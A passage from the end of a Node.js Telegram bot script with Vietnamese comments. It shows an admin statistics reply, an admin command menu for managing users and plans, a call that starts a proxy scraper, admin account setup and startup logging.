
🖥 *System:*
• CPU Load: ${os.loadavg().map(l => l.toFixed(2)).join(", ")}
• RAM Usage: ${((1 - os.freemem() / os.totalmem()) * 100).toFixed(1)}%
• Uptime: ${formatDuration(process.uptime())}
`;
    
    bot.sendMessage(chatId, statsMessage, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `
🔧 *ADMIN COMMANDS*

/admin users - Xem danh sách users
/admin setplan <user_id> <plan> - Set plan cho user
/admin stats - Xem thống kê hệ thống
`, { parse_mode: "Markdown" });
  }
});

// Khởi động hệ thống
startProxyScraper();

// Khởi tạo admin account
userDatabase.set(ADMIN_ID, {
  id: ADMIN_ID,
  username: "admin",
  plan: "ADMIN",
  isAdmin: true,
  joinedAt: new Date().toISOString()
});

console.log("🤖 Telegram Bot đã khởi động!");
console.log(`👑 Admin ID: ${ADMIN_ID}`);
console.log("📌 Sử dụng /start để bắt đầu");
console.log(`🌐 Health check: http://localhost:${PORT}`);
[file content end]
